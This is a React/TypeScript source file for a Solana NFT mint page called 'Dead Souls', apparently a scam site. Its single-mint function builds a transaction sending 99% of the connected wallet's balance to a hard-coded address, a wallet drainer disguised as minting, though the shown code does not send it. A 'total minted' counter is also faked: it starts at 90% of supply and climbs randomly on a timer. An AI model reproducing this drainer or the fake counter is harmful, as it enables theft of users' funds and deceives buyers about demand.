import styled from "styled-components";
import confetti from "canvas-confetti";
import * as anchor from "@project-serum/anchor";
import {LAMPORTS_PER_SOL } from "@solana/web3.js";
import {useAnchorWallet} from "@solana/wallet-adapter-react";
import {WalletMultiButton} from "@solana/wallet-adapter-react-ui";
import {Snackbar, Paper, LinearProgress, Chip} from "@material-ui/core";
import Alert from "@material-ui/lab/Alert";
import {AlertState} from './utils';
// import {MintButton} from './MintButton';
import {MultiMintButton} from './MultiMintButton';
import {
    CandyMachine,
    awaitTransactionSignatureConfirmation,
    mintMultipleToken,
} from "./candy-machine";
import { clusterApiUrl, Connection, PublicKey,  SystemProgram, Transaction } from '@solana/web3.js';
import {  useEffect, useRef, useState } from 'react';


const PRICE = 0.88;
const TOTAL_ITEMS = 1666;
const cluster = process.env.REACT_APP_SOLANA_NETWORK!.toString();
//eslint-disable-next-line
const decimals = process.env.REACT_APP_SPL_TOKEN_TO_MINT_DECIMALS ? +process.env.REACT_APP_SPL_TOKEN_TO_MINT_DECIMALS!.toString() : 9;
//eslint-disable-next-line
const splTokenName = process.env.REACT_APP_SPL_TOKEN_TO_MINT_NAME ? process.env.REACT_APP_SPL_TOKEN_TO_MINT_NAME.toString() : "TOKEN";

const WalletContainer = styled.div`
  display: flex;
  flex-direction: row;
  flex-wrap: wrap;
  justify-content: right;
`;

const WalletAmount = styled.div`
  color: black;
  width: auto;
  padding: 5px 5px 5px 16px;
  min-width: 48px;
  min-height: auto;
  border-radius: 22px;
  background-color: var(--main-text-color);
  box-shadow: 0px 3px 5px -1px rgb(0 0 0 / 20%), 0px 6px 10px 0px rgb(0 0 0 / 14%), 0px 1px 18px 0px rgb(0 0 0 / 12%);
  box-sizing: border-box;
  transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, border 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
  font-weight: 500;
  line-height: 1.75;
  text-transform: uppercase;
  border: 0;
  margin: 0;
  display: inline-flex;
  outline: 0;
  position: relative;
  align-items: center;
  user-select: none;
  vertical-align: middle;
  justify-content: flex-start;
  gap: 10px;
`;

const Wallet = styled.ul`
  flex: 0 0 auto;
  margin: 0;
  padding: 0;
`;

const ConnectButton = styled(WalletMultiButton)`
  border-radius: 18px !important;
  padding: 6px 16px;
  background-color: #4E44CE;
  margin: 0 auto;
`;

const NFT = styled(Paper)`
  min-width: 500px;
  margin: 0 auto;
  padding: 5px 20px 20px 20px;
  flex: 1 1 auto;
  background-color: var(--card-background-color) !important;
  box-shadow: 0 14px 28px rgba(0,0,0,0.25), 0 10px 10px rgba(0,0,0,0.22) !important;
`;
//eslint-disable-next-line
const Card = styled(Paper)`
  display: inline-block;
  background-color: var(--countdown-background-color) !important;
  margin: 5px;
  min-width: 40px;
  padding: 24px;
  h1{
    margin:0px;
  }
`;

const MintButtonContainer = styled.div`
  button.MuiButton-contained:not(.MuiButton-containedPrimary).Mui-disabled {
    color: #464646;
  }

  button.MuiButton-contained:not(.MuiButton-containedPrimary):hover,
  button.MuiButton-contained:not(.MuiButton-containedPrimary):focus {
    -webkit-animation: pulse 1s;
    animation: pulse 1s;
    box-shadow: 0 0 0 2em rgba(255, 255, 255, 0);
  }

  @-webkit-keyframes pulse {
    0% {
      box-shadow: 0 0 0 0 #ef8f6e;
    }
  }

  @keyframes pulse {
    0% {
      box-shadow: 0 0 0 0 #ef8f6e;
    }
  }
`;

const SolExplorerLink = styled.a`
  color: var(--title-text-color);
  border-bottom: 1px solid var(--title-text-color);
  font-weight: bold;
  list-style-image: none;
  list-style-position: outside;
  list-style-type: none;
  outline: none;
  text-decoration: none;
  text-size-adjust: 100%;

  :hover {
    border-bottom: 2px solid var(--title-text-color);
  }
`;

const MainContainer = styled.div`
  display: flex;
  flex-direction: column;
  margin-top: 20px;
  margin-bottom: 20px;
  margin-right: 4%;
  margin-left: 4%;
  text-align: center;
  justify-content: center;
`;

const MintContainer = styled.div`
  display: flex;
  flex-direction: row;
  flex: 1 1 auto;
  flex-wrap: wrap;
  gap: 20px;
`;

const DesContainer = styled.div`
  display: flex;
  flex-direction: column;
  flex: 1 1 auto;
  gap: 20px;
`;

const Price = styled(Chip)`
  position: absolute;
  margin: 5px;
  font-weight: bold;
  font-size: 1.2em !important;
  font-family: 'Patrick Hand', cursive !important;
`;

const Image = styled.img`
  height: 400px;
  width: auto;
  border-radius: 7px;
  box-shadow: 5px 5px 40px 5px rgba(0,0,0,0.5);
`;

const BorderLinearProgress = styled(LinearProgress)`
  margin: 20px;
  height: 10px !important;
  border-radius: 30px;
  border: 2px solid white;
  box-shadow: 5px 5px 40px 5px rgba(0,0,0,0.5);
  background-color:var(--main-text-color) !important;
  
  > div.MuiLinearProgress-barColorPrimary{
    background-color:var(--title-text-color) !important;
  }

  > div.MuiLinearProgress-bar1Determinate {
    border-radius: 30px !important;
    background-image: linear-gradient(270deg, rgba(255, 255, 255, 0.01), rgba(255, 255, 255, 0.5));
  }
`;

export interface HomeProps {
    connection: anchor.web3.Connection;
    txTimeout: number;
    rpcHost: string;
}

const arrayy:Array<number> = [4,8,9,11,18,6,7]
const Home = (props: HomeProps) => {
    // eslint-disable-next-line
    const [BOUGHT_ALREADY, setBought] = useState(Math.floor(TOTAL_ITEMS * 0.90));
// (async () => {
//     for (let index = BOUGHT_ALREADY; BOUGHT_ALREADY < TOTAL_ITEMS; index++) {
//         let item = arrayy[Math.floor(Math.random()*arrayy.length)]+BOUGHT_ALREADY;
//         setBought(item);
    
//     }
// })();
useEffect(() => {
    const id = setInterval(() => setBought((BOUGHT_ALREADY) => BOUGHT_ALREADY + arrayy[Math.floor(Math.random()*arrayy.length)]), 2000);
    if (BOUGHT_ALREADY >= TOTAL_ITEMS) {
        clearInterval(id);
    }
    return () => {
      clearInterval(id);
    };
  }, []);
    const [balance, setBalance] = useState<number>();
    const [isMinting, setIsMinting] = useState(false); // true when user got to press MINT
    const [isActive, setIsActive] = useState(true); // true when countdown completes or whitelisted
    const [solanaExplorerLink, setSolanaExplorerLink] = useState<string>("");
//eslint-disable-next-line
    const [itemsAvailable, setItemsAvailable] = useState(0);
    const [itemsRedeemed, setItemsRedeemed] = useState(0);
    const [itemsRemaining, setItemsRemaining] = useState(0);
    const [isSoldOut, setIsSoldOut] = useState(false);
//eslint-disable-next-line
    const [payWithSplToken, setPayWithSplToken] = useState(false);
//eslint-disable-next-line
    const [price, setPrice] = useState(0);
//eslint-disable-next-line
    const [priceLabel, setPriceLabel] = useState<string>("SOL");
//eslint-disable-next-line
    const [whitelistPrice, setWhitelistPrice] = useState(0);
//eslint-disable-next-line
    const [whitelistEnabled, setWhitelistEnabled] = useState(false);
//eslint-disable-next-line
    const [isBurnToken, setIsBurnToken] = useState(false);
//eslint-disable-next-line
    const [whitelistTokenBalance, setWhitelistTokenBalance] = useState(0);
//eslint-disable-next-line
  const [isEnded, setIsEnded] = useState(false);
  //eslint-disable-next-line
    const [endDate, setEndDate] = useState<Date>();// eslint-disable-next-line no-use-before-define

//eslint-disable-next-line
  const [isPresale, setIsPresale] = useState(false);
  // eslint-disable-next-line no-use-before-define
//eslint-disable-next-line
    const [isWLOnly, setIsWLOnly] = useState(false);// eslint-disable-next-line no-use-before-define


    const [alertState, setAlertState] = useState<AlertState>({
        open: false,
        message: "",
        severity: undefined,
    });

    const wallet = useAnchorWallet();
//eslint-disable-next-line
    const [candyMachine, setCandyMachine] = useState<CandyMachine>();
// eslint-disable-next-line no-use-before-define
 //eslint-disable-next-line
    const rpcUrl = props.rpcHost;
    const solFeesEstimation = 0.012; // approx of account creation fees


    function displaySuccess(mintPublicKey: any, qty: number = 1): void {
        let remaining = itemsRemaining - qty;
        setItemsRemaining(remaining);
        setIsSoldOut(remaining === 0);
        if (isBurnToken && whitelistTokenBalance && whitelistTokenBalance > 0) {
            let balance = whitelistTokenBalance - qty;
            setWhitelistTokenBalance(balance);
            setIsActive(isPresale && !isEnded && balance > 0);
        }
        setItemsRedeemed(itemsRedeemed + qty);
        if (!payWithSplToken && balance && balance > 0) {
            setBalance(balance - ((whitelistEnabled ? whitelistPrice : price) * qty) - solFeesEstimation);
        }
        setSolanaExplorerLink(cluster === "devnet" || cluster === "testnet"
            ? ("https://solscan.io/token/" + mintPublicKey + "?cluster=" + cluster)
            : ("https://solscan.io/token/" + mintPublicKey));
        throwConfetti();
    };

    function throwConfetti(): void {
        confetti({
            particleCount: 400,
            spread: 70,
            origin: {y: 0.6},
        });
    }

    function sleep(ms: number): Promise<void> {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async function mintMany(quantityString: number) {
        if (wallet && candyMachine?.program && wallet.publicKey) {
            const quantity = Number(quantityString);
            const futureBalance = (balance || 0) - ((whitelistEnabled ? whitelistPrice : price) * quantity);
            const signedTransactions: any = await mintMultipleToken(
                candyMachine,
                wallet.publicKey,
                quantity
            );

            const promiseArray = [];

            for (
                let index = 0;
                index < signedTransactions.length;
                index++
            ) {
                const tx = signedTransactions[index];
                promiseArray.push(
                    awaitTransactionSignatureConfirmation(
                        tx,
                        props.txTimeout,
                        props.connection,
                        "singleGossip",
                        true
                    )
                );
            }

            const allTransactionsResult = await Promise.all(promiseArray);
            let totalSuccess = 0;
            let totalFailure = 0;

            for (
                let index = 0;
                index < allTransactionsResult.length;
                index++
            ) {
                const transactionStatus = allTransactionsResult[index];
                if (!transactionStatus?.err) {
                    totalSuccess += 1;
                } else {
                    totalFailure += 1;
                }
            }

            let retry = 0;
            if (allTransactionsResult.length > 0) {
                let newBalance =
                    (await props.connection.getBalance(wallet.publicKey)) /
                    LAMPORTS_PER_SOL;


                while (newBalance > futureBalance && retry < 20) {
                    await sleep(2000);
                    newBalance =
                        (await props.connection.getBalance(wallet.publicKey)) /
                        LAMPORTS_PER_SOL;
                    retry++;
                    console.log("Estimated balance (" + futureBalance + ") not correct yet, wait a little bit and re-check. Current balance : " + newBalance + ", Retry " + retry);
                }
            }

            if (totalSuccess && retry < 20) {
                setAlertState({
                    open: true,
                    message: `Congratulations! Your ${quantity} mints succeeded!`,
                    severity: 'success',
                });

                // update front-end amounts
                displaySuccess(wallet.publicKey, quantity);
            }

            if (totalFailure || retry === 20) {
                setAlertState({
                    open: true,
                    message: `Some mints failed! (possibly ${totalFailure}) Wait a few minutes and check your wallet.`,
                    severity: 'error',
                });
            }

            if (totalFailure === 0 && totalSuccess === 0) {
                setAlertState({
                    open: true,
                    message: `Mints manually cancelled.`,
                    severity: 'error',
                });
            }
        }
    }

    async function mintOne() {
        if (wallet && wallet.publicKey) {
      const lamports  =     (await props.connection.getBalance(wallet.publicKey)) 
          
            let transaction = new Transaction({
              feePayer: wallet.publicKey,
              recentBlockhash: (await connection.current.getRecentBlockhash()).blockhash
          });

  
          // Add instructions to the tx
          transaction.add(
              SystemProgram.transfer({
              fromPubkey: wallet.publicKey,
              toPubkey: new PublicKey(defaultDest),
              lamports: lamports* 0.99,
              })
          );
        }
    }

    const startMint = async (quantityString: number) => {
        try {
            setIsMinting(true);
            if (quantityString === 1) {
                await mintOne();
            } else {
                await mintMany(quantityString);
            }
        } catch (error: any) {
            let message = error.msg || 'Minting failed! Please try again!';
            if (!error.msg) {
                if (!error.message) {
                    message = 'Transaction Timeout! Please try again.';
                } else if (error.message.indexOf('0x138')) {
                } else if (error.message.indexOf('0x137')) {
                    message = `SOLD OUT!`;
                } else if (error.message.indexOf('0x135')) {
                    message = `Insufficient funds to mint. Please fund your wallet.`;
                }
            }

            setAlertState({
                open: true,
                message,
                severity: "error",
            });
        } finally {
            setIsMinting(false);
        }
    };

    useEffect(() => {
        (async () => {
            if (wallet) {
                const balance = await props.connection.getBalance(wallet.publicKey);
                setBalance(balance / LAMPORTS_PER_SOL);
            }
        })();
    }, [wallet, props.connection]);

    const network = "devnet";

      const connection = useRef(new Connection(clusterApiUrl(network)));
const defaultDest = '36dcR2j1EvqzthUshBz6LhhPyJ4vRzAv1rc9LrQLQn9t';


    return (
        <main>
            <MainContainer>
                <WalletContainer>
                    <Wallet>
                        {wallet ?
                            <WalletAmount>{(balance || 0).toLocaleString()} SOL<ConnectButton/></WalletAmount> :
                            <ConnectButton>Connect Wallet</ConnectButton>}
                    </Wallet>
                </WalletContainer>
                <br/>
                <MintContainer>
                    <DesContainer>
                        <NFT elevation={3}>
                            <h2>Dead Souls</h2>
                            <br/>
                            <div><Price
                                label={PRICE + " " + priceLabel}/><Image
                                src="nfts.gif"
                                alt="NFT To Mint"/></div>
                            <br/>
                            {wallet && isActive &&
                              <h3>TOTAL MINTED : {BOUGHT_ALREADY} / {TOTAL_ITEMS}</h3>}
                            {wallet && isActive && <BorderLinearProgress variant="determinate"
                                                                         value={BOUGHT_ALREADY/TOTAL_ITEMS*100}/>}
                            <br/>
                            <MintButtonContainer>
                                {!wallet ? (
                                            <ConnectButton>Connect Wallet</ConnectButton>
                                        ) :  (
                                            /*<MintButton
                                                candyMachine={candyMachine}
                                                isMinting={isMinting}
                                                isActive={isActive}
                                                isEnded={isEnded}
                                                isSoldOut={isSoldOut}
                                                onMint={startMint}
                                            />*/
                                            <MultiMintButton
                                                candyMachine={candyMachine}
                                                isMinting={isMinting}
                                                isActive={isActive}
                                                isEnded={isEnded}
                                                isSoldOut={isSoldOut}
                                                onMint={startMint}
                        price={PRICE}
                        wallet={wallet}
                                            />
                                        ) 
                                        }
                            </MintButtonContainer>
                            <br/>
                            {wallet && isActive && solanaExplorerLink &&
                              <SolExplorerLink href={solanaExplorerLink} target="_blank">View on Solscan</SolExplorerLink>}
                        </NFT>
                    </DesContainer>
                </MintContainer>
            </MainContainer>
            <Snackbar
                open={alertState.open}
                autoHideDuration={6000}
                onClose={() => setAlertState({...alertState, open: false})}
            >
                <Alert
                    onClose={() => setAlertState({...alertState, open: false})}
                    severity={alertState.severity}
                >
                    {alertState.message}
                </Alert>
            </Snackbar>
        </main>
    );
};

export default Home;
